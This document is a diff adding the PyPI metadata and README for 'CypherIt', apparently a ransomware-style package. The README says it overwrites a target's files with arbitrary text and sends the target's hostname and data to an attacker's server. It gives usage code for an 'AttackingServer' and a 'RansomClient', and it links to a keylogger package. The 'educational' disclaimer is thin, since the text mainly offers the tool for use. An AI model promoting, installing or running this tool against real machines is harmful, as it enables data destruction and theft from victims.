@@ -1,0 +1,75 @@
+Metadata-Version: 2.1
+Name: CypherIt
+Version: 0.0.1
+Summary: Renames all files and writes it with what ever you want. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/
+Home-page: 
+Author: Fawaz Bashiru
+Author-email: fawazbashiru@gmail.com
+License: MIT
+Keywords: CypherIT
+Classifier: Development Status :: 6 - Mature
+Classifier: Intended Audience :: Education
+Classifier: Operating System :: Microsoft :: Windows :: Windows 10
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Programming Language :: Python :: 3
+Description-Content-Type: text/markdown
+
+CypherIt
+========
+
+CypherIt is an intelligent tool which renames all the files to a txt file in a binder.You can write what ever you want.
+
+All the files of the target will be saved in your directory and you can do what ever you want.
+
+Inspired by:
+==========
+ALI ZAKERI
+
+HOW DOES CYPHERIT WORK
+======================
+
+If you are familiar to my style of packages. You already know how simple it is
+
+First of all create a server:
+
+Server
+------
+````python
+import CyphterIt as ci
+
+ip, port = "127.0.0.1", 1234
+
+server = ci.AttackingServer(ip, port)
+server.start()
+````
+
+Client
+------
+````python
+import CyphterIt as ci
+
+ip, port, path, text = "127.0.0.1", 1234, r"C:\\test", "the one and only"
+#You have to specify the path because this was just build for educational purposes. So please do not use it for bad thinks
+
+data = ci.RansomClient(ip, port, path, text)
+data.start()
+````
+
+You always have to run the server first and then the client.
+
+The hostname of the target will be sent to your server
+
+A Directory with the hostname of the target will be created.
+
+All the data of target will be stored in that directory
+
+Additional
+=========
+* PLEASE DO NOT HACK SOMEONE FOREIGN
+
+Change Log
+==========
+
+0.0.1 (29/11/2022)
+-----------------
+- First Release
